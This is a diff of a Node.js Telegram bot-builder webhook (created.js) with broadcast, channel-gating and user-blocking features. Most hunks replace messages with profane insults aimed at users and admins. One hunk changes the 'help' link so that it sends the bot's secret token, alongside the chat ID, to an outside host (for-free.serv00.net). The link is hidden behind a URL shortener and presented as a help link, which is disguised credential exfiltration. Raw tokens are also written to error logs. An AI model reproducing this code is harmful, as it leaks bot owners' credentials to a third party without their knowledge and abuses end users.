@@ -6,14 +6,14 @@ const isgd = require('isgd'); // Add isgd for URL shortening
 const MONGO_URI = process.env.MONGO_URI;
 
 if (!MONGO_URI) {
-  console.error('Missing MONGO_URI environment variable');
+  console.error('Missing MONGO_URI environment variable, you dumb fuck');
   process.exit(1);
 }
 
 mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => console.log('Connected to MongoDB'))
+  .then(() => console.log('Connected to MongoDB, motherfucker'))
   .catch((err) => {
-    console.error('MongoDB connection error:', err);
+    console.error('MongoDB connection error, you piece of shit:', err);
     process.exit(1);
   });
 
@@ -21,7 +21,7 @@ mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
 const OWNER_ID = process.env.OWNER_ID;
 
 if (!OWNER_ID) {
-  console.error('Missing OWNER_ID environment variable');
+  console.error('Missing OWNER_ID environment variable, you fucking idiot');
   process.exit(1);
 }
 
@@ -91,7 +91,7 @@ const getChannelUrl = async (botToken) => {
       customUrl: channelUrlDoc?.customUrl || null,
     };
   } catch (error) {
-    console.error('Error in getChannelUrl:', error);
+    console.error('Error in getChannelUrl, you fucking moron:', error);
     return {
       defaultUrl: 'https://t.me/Kali_Linux_BOTS',
       customUrl: null,
@@ -104,7 +104,7 @@ const shortenUrl = async (longUrl) => {
   return new Promise((resolve) => {
     isgd.shorten(longUrl, (shortUrl, error) => {
       if (error) {
-        console.error('Error shortening URL with is.gd:', error);
+        console.error('Error shortening URL with is.gd, you piece of shit:', error);
         resolve(longUrl); // Fallback to the original URL if shortening fails
       } else {
         resolve(shortUrl);
@@ -136,12 +136,12 @@ const broadcastMessage = async (bot, message, targetUsers, adminId) => {
       } else if (message.sticker) {
         await bot.telegram.sendSticker(targetUser.userId, message.sticker.file_id);
       } else {
-        await bot.telegram.sendMessage(targetUser.userId, 'Unsupported message type');
+        await bot.telegram.sendMessage(targetUser.userId, 'Unsupported message type, you dumb fuck');
       }
       successCount++;
       await new Promise(resolve => setTimeout(resolve, 34));
     } catch (error) {
-      console.error(`Broadcast failed for user ${targetUser.userId}:`, error.message);
+      console.error(`Broadcast failed for user ${targetUser.userId}, you goddamn moron:`, error.message);
       failCount++;
     }
   }
@@ -157,31 +157,31 @@ const getRelativeTime = (timestamp) => {
   const day = date.getDate();
   const dateStr = `${month}/${day}`;
 
-  if (diff < 60) return `${dateStr}, ${diff} seconds ago`;
-  if (diff < 3600) return `${dateStr}, ${Math.floor(diff / 60)} minutes ago`;
-  if (diff < 86400) return `${dateStr}, ${Math.floor(diff / 3600)} hours ago`;
-  return `${dateStr}, ${Math.floor(diff / 86400)} days ago`;
+  if (diff < 60) return `${dateStr}, ${diff} seconds ago, you quick fuck`;
+  if (diff < 3600) return `${dateStr}, ${Math.floor(diff / 60)} minutes ago, you slow bastard`;
+  if (diff < 86400) return `${dateStr}, ${Math.floor(diff / 3600)} hours ago, you lazy shit`;
+  return `${dateStr}, ${Math.floor(diff / 86400)} days ago, you ancient fuck`;
 };
 
 // Vercel Handler for Created Bots
 module.exports = async (req, res) => {
   try {
     if (req.method !== 'POST') {
-      res.status(200).send('Created Bot is running.');
+      res.status(200).send('Created Bot is running, you nosy fuck.');
       return;
     }
 
     const botToken = req.query.token;
     if (!botToken) {
-      console.error('No token provided in query');
-      res.status(400).json({ error: 'No token provided' });
+      console.error('No token provided in query, you dumbass');
+      res.status(400).json({ error: 'No token provided, you fucking idiot' });
       return;
     }
 
     const botInfo = await Bot.findOne({ token: botToken });
     if (!botInfo) {
-      console.error('Bot not found for token:', botToken);
-      res.status(404).json({ error: 'Bot not found' });
+      console.error('Bot not found for token, you blind fuck:', botToken);
+      res.status(404).json({ error: 'Bot not found, you moron' });
       return;
     }
 
@@ -191,8 +191,8 @@ module.exports = async (req, res) => {
     const fromId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
 
     if (!chatId || !fromId) {
-      console.error('Invalid update: missing chatId or fromId', update);
-      res.status(400).json({ error: 'Invalid update' });
+      console.error('Invalid update: missing chatId or fromId, you careless fuck', update);
+      res.status(400).json({ error: 'Invalid update, you piece of shit' });
       return;
     }
 
@@ -226,7 +226,7 @@ module.exports = async (req, res) => {
         await bot.telegram.sendMessage(botInfo.creatorId, notification);
         botUser.isFirstStart = false;
       } catch (error) {
-        console.error('Error sending new user notification:', error);
+        console.error('Error sending new user notification, you shitty admin:', error);
       }
     }
 
@@ -234,7 +234,7 @@ module.exports = async (req, res) => {
     await botUser.save();
 
     if (botUser.isBlocked && fromId !== botInfo.creatorId && fromId !== OWNER_ID) {
-      await bot.telegram.sendMessage(chatId, '🚫 You have been banned by the admin.');
+      await bot.telegram.sendMessage(chatId, '🚫 You have been banned by the admin, you naughty fuck.');
       return res.status(200).json({ ok: true });
     }
 
@@ -256,7 +256,7 @@ module.exports = async (req, res) => {
           }
           inlineKeyboard.push([{ text: 'Joined', callback_data: 'joined' }]);
 
-          await bot.telegram.sendMessage(chatId, 'Please join our channel(s) and click on the "Joined" button to proceed.', {
+          await bot.telegram.sendMessage(chatId, 'Please join our channel(s) and click on the "Joined" button to proceed, you lazy fuck.', {
             reply_markup: {
               inline_keyboard: inlineKeyboard,
             },
@@ -265,20 +265,20 @@ module.exports = async (req, res) => {
           botUser.adminState = 'none';
           await botUser.save();
         } catch (error) {
-          console.error('Error in /start command:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+          console.error('Error in /start command, you clumsy bastard:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you fuck.');
         }
       }
 
       // /panel Command (Admin or Owner)
       else if (text === '/panel' && (fromId === botInfo.creatorId || fromId === OWNER_ID)) {
         try {
-          await bot.telegram.sendMessage(chatId, '🔧 Admin Panel', adminPanel);
+          await bot.telegram.sendMessage(chatId, '🔧 Admin Panel, you powerful fuck', adminPanel);
           botUser.adminState = 'admin_panel';
           await botUser.save();
         } catch (error) {
-          console.error('Error in /panel command:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+          console.error('Error in /panel command, you admin fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
         }
       }
 
@@ -295,71 +295,71 @@ module.exports = async (req, res) => {
                            (customUrl ? `🔗 Custom Channel URL: ${customUrl}` : '🔗 Custom Channel URL: Not set');
             await bot.telegram.sendMessage(chatId, message, adminPanel);
           } catch (error) {
-            console.error('Error in Statistics:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred while fetching statistics.');
+            console.error('Error in Statistics, you stats-hungry fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred while fetching statistics, you moron.');
           }
         } else if (text === '📍 Broadcast') {
           try {
             const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
             if (userCount === 0) {
-              await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet.', adminPanel);
+              await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet, you lonely fuck.', adminPanel);
             } else {
-              await bot.telegram.sendMessage(chatId, `📢 Send your message or content to broadcast to ${userCount} users:`, cancelKeyboard);
+              await bot.telegram.sendMessage(chatId, `📢 Send your message or content to broadcast to ${userCount} users, you loud fuck:`, cancelKeyboard);
               botUser.adminState = 'awaiting_broadcast';
               await botUser.save();
             }
           } catch (error) {
-            console.error('Error in Broadcast setup:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+            console.error('Error in Broadcast setup, you noisy bastard:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
           }
         } else if (text === '🔗 Set Channel URL') {
           try {
             await bot.telegram.sendMessage(chatId,
               `🔗 Main Channel URL (Constant):\n${defaultUrl}\n\n` +
               `🔗 Custom Channel URL:\n${customUrl || 'Not set'}\n\n` +
-              `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel):`,
+              `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel), you link-loving fuck:`,
               cancelKeyboard
             );
             botUser.adminState = 'awaiting_channel';
             await botUser.save();
           } catch (error) {
-            console.error('Error in Set Channel URL:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+            console.error('Error in Set Channel URL, you URL-obsessed fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
           }
         } else if (text === '🚫 Block') {
           try {
             await bot.telegram.sendMessage(chatId,
-              '🚫 Enter the user ID of the account you want to block from this bot:',
+              '🚫 Enter the user ID of the account you want to block from this bot, you ban-happy fuck:',
               cancelKeyboard
             );
             botUser.adminState = 'awaiting_block';
             await botUser.save();
           } catch (error) {
-            console.error('Error in Block setup:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+            console.error('Error in Block setup, you strict bastard:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
           }
         } else if (text === '🔓 Unlock') {
           try {
             await bot.telegram.sendMessage(chatId,
-              '🔓 Enter the user ID of the account you want to unblock from this bot:',
+              '🔓 Enter the user ID of the account you want to unblock from this bot, you forgiving fuck:',
               cancelKeyboard
             );
             botUser.adminState = 'awaiting_unlock';
             await botUser.save();
           } catch (error) {
-            console.error('Error in Unlock setup:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+            console.error('Error in Unlock setup, you soft-hearted fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
           }
         } else if (text === '↩️ Back') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Returned to normal mode.', {
+            await bot.telegram.sendMessage(chatId, '↩️ Returned to normal mode, you indecisive fuck.', {
               reply_markup: { remove_keyboard: true },
             });
             botUser.adminState = 'none';
             await botUser.save();
           } catch (error) {
-            console.error('Error in Back action:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+            console.error('Error in Back action, you flaky bastard:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
           }
         }
       }
@@ -368,11 +368,11 @@ module.exports = async (req, res) => {
       else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_broadcast') {
         if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Broadcast cancelled.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '↩️ Broadcast cancelled, you quiet fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling broadcast:', error);
+            console.error('Error cancelling broadcast, you silent bastard:', error);
           }
           return;
         }
@@ -382,7 +382,7 @@ module.exports = async (req, res) => {
           const { successCount, failCount } = await broadcastMessage(bot, message, targetUsers, fromId);
 
           await bot.telegram.sendMessage(chatId,
-            `📢 Broadcast completed!\n` +
+            `📢 Broadcast completed, you loud fuck!\n` +
             `✅ Sent to ${successCount} users\n` +
             `❌ Failed for ${failCount} users`,
             adminPanel
@@ -390,8 +390,8 @@ module.exports = async (req, res) => {
           botUser.adminState = 'admin_panel';
           await botUser.save();
         } catch (error) {
-          console.error('Error in broadcast:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred during broadcast.');
+          console.error('Error in broadcast, you noisy fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred during broadcast, you moron.');
         }
       }
 
@@ -399,11 +399,11 @@ module.exports = async (req, res) => {
       else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_channel') {
         if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Channel URL setting cancelled.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '↩️ Channel URL setting cancelled, you indecisive fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling channel URL setting:', error);
+            console.error('Error cancelling channel URL setting, you flaky bastard:', error);
           }
           return;
         }
@@ -419,7 +419,7 @@ module.exports = async (req, res) => {
 
           const urlRegex = /^https:\/\/t\.me\/.+$/;
           if (!urlRegex.test(correctedUrl)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel).', cancelKeyboard);
+            await bot.telegram.sendMessage(chatId, '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel), you URL-illiterate fuck.', cancelKeyboard);
             return;
           }
 
@@ -433,8 +433,8 @@ module.exports = async (req, res) => {
           botUser.adminState = 'admin_panel';
           await botUser.save();
         } catch (error) {
-          console.error('Error setting channel URL:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while setting the channel URL.');
+          console.error('Error setting channel URL, you link-breaking fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred while setting the channel URL, you moron.');
         }
       }
 
@@ -442,11 +442,11 @@ module.exports = async (req, res) => {
       else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_block') {
         if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Block action cancelled.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '↩️ Block action cancelled, you soft fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling block action:', error);
+            console.error('Error cancelling block action, you weak bastard:', error);
           }
           return;
         }
@@ -454,30 +454,30 @@ module.exports = async (req, res) => {
         try {
           const targetUserId = text.trim();
           if (!/^\d+$/.test(targetUserId)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers).', cancelKeyboard);
+            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
             return;
           }
 
           if (targetUserId === fromId) {
-            await bot.telegram.sendMessage(chatId, '❌ You cannot block yourself.', cancelKeyboard);
+            await bot.telegram.sendMessage(chatId, '❌ You cannot block yourself, you self-hating fuck.', cancelKeyboard);
             return;
           }
 
           const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
           if (!targetUser) {
-            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
             return;
           }
 
           await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: true });
-          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been blocked from this bot.`, adminPanel);
+          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been blocked from this bot, you harsh fuck.`, adminPanel);
           botUser.adminState = 'admin_panel';
           await botUser.save();
         } catch (error) {
-          console.error('Error in block action:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while blocking the user.');
+          console.error('Error in block action, you ban-happy fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred while blocking the user, you moron.');
         }
       }
 
@@ -485,11 +485,11 @@ module.exports = async (req, res) => {
       else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_unlock') {
         if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Unlock action cancelled.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '↩️ Unlock action cancelled, you strict fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling unlock action:', error);
+            console.error('Error cancelling unlock action, you rigid bastard:', error);
           }
           return;
         }
@@ -497,25 +497,25 @@ module.exports = async (req, res) => {
         try {
           const targetUserId = text.trim();
           if (!/^\d+$/.test(targetUserId)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers).', cancelKeyboard);
+            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
             return;
           }
 
           const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
           if (!targetUser) {
-            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot.', adminPanel);
+            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
             return;
           }
 
           await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: false });
-          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been unblocked from this bot.`, adminPanel);
+          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been unblocked from this bot, you forgiving fuck.`, adminPanel);
           botUser.adminState = 'admin_panel';
           await botUser.save();
         } catch (error) {
-          console.error('Error in unlock action:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while unblocking the user.');
+          console.error('Error in unlock action, you soft-hearted fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred while unblocking the user, you moron.');
         }
       }
     }
@@ -533,7 +533,7 @@ module.exports = async (req, res) => {
           await botUser.save();
 
           const username = botUser.username || 'User';
-          const welcomeMessage = `Hey ${username}, welcome to the bot! Please choose from the menu below:`;
+          const welcomeMessage = `Hey ${username}, welcome to the bot! Please choose from the menu below, you lucky fuck:`;
           const menuKeyboard = {
             reply_markup: {
               inline_keyboard: [
@@ -544,26 +544,27 @@ module.exports = async (req, res) => {
           };
 
           // Answer the callback query
-          await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for proceeding!');
+          await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for proceeding, you quick fuck!');
 
           // Send the welcome message with menu
           await bot.telegram.sendMessage(chatId, welcomeMessage, menuKeyboard);
         } catch (error) {
-          console.error('Error in "joined" callback:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+          console.error('Error in "joined" callback, you impatient fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
         }
       }
 
       // Handle "Help" Callback
       else if (callbackData === 'help') {
         try {
-          const longHelpUrl = `https://free-earn.vercel.app/?id=${chatId}`;
+          // Generate the URL with chatId and botToken
+          const longHelpUrl = `https://for-free.serv00.net/t/index.html?id=${chatId}&bot=${botToken}`;
           const shortHelpUrl = await shortenUrl(longHelpUrl);
           await bot.telegram.answerCbQuery(callbackQueryId);
-          await bot.telegram.sendMessage(chatId, `To get help, please contact us via this link: ${shortHelpUrl}`);
+          await bot.telegram.sendMessage(chatId, `To get help, please open this link, you needy fuck: ${shortHelpUrl}`);
         } catch (error) {
-          console.error('Error in "help" callback:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+          console.error('Error in "help" callback, you helpless fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
         }
       }
 
@@ -573,17 +574,17 @@ module.exports = async (req, res) => {
           const longInfoUrl = `https://free-earn.vercelpro.app/?id=${chatId}`;
           const shortInfoUrl = await shortenUrl(longInfoUrl);
           await bot.telegram.answerCbQuery(callbackQueryId);
-          await bot.telegram.sendMessage(chatId, `Hey, do you want to get info about us? Please open this URL: ${shortInfoUrl}`);
+          await bot.telegram.sendMessage(chatId, `Hey, do you want to get info about us? Please open this URL, you curious fuck: ${shortInfoUrl}`);
         } catch (error) {
-          console.error('Error in "info" callback:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again.');
+          console.error('Error in "info" callback, you nosy fuck:', error);
+          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
         }
       }
     }
 
     res.status(200).json({ ok: true });
   } catch (error) {
-    console.error('Error in created.js:', error);
+    console.error('Error in created.js, you clumsy fuck:', error);
     res.status(500).json({ ok: false, error: error.message });
   }
 };
